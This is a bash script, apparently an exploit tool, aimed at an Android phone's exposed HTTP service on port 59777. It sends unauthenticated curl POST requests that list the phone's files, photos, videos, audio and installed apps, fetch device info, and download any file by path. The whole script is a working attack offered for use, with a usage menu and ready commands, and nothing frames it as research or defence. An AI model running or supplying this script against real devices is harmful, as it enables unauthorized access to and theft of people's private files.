#!/bin/bash

usage(){
printf "

$0 <IP of the Android phone> <command> <path>

Code developed by: \e[1;34m Febin \e[0m

Available Commands:>

    listFiles         : List all Files.
    listPics          : List all Pictures.
    listVideos        : List all videos.
    listAudios        : List all audios.
    listApps          : List Applications installed.
    listAppsSystem    : List System apps.
    listAppsPhone     : List Communication related apps.
    listAppsSdcard    : List apps on the SDCard.
    listAppsAll       : List all Application.
    getFile           : Download a file.
    getDeviceInfo     : Get device info.

"

}

exploit(){
IP="$1"

path1=$3
cmd=$(printf "{\"command\":""\"$2\"}")
URL=$(printf "http://"$IP":59777/"$path1)
if [ ! $2 = "getFile" ]
then
printf " Name    Date    Created    Type    Size \n"
printf " ----    ----    -------    ----    ---- \n"
curl $URL -s -X POST -H "Content-Type: application/json" -d $cmd | sed s/"{\"name\":"//g | sed s/"\"time\":"//g | sed s/"\"type\":"//g | sed s/"\"size\":"//g | tr -d "[" | tr -d "]" | tr '"' " " | tr "," " " | tr -d "}"
else
curl $URL -s -X POST -H "Content-Type: application/json" -d $cmd --output -
fi
}

main(){
exploit $1 $2 $3

}

if [[ $1 && $2 && $3 ]]
then
main $1 $2 $3
else
usage
fi
